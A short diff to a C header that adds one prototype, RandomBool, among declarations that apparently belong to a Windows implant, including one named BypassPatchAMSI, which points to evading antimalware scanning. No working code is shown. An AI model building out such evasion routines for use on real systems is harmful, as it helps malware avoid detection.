@@ -75,6 +75,7 @@ BOOL     PipeRead(  HANDLE Handle, PBUFFER Buffer );
 
 BOOL     BypassPatchAMSI( );
 ULONG    RandomNumber32( VOID );
+BOOL     RandomBool( VOID );
 UINT_PTR HashEx( LPVOID String, UINT_PTR Length, BOOL Upper );
 
 #endif
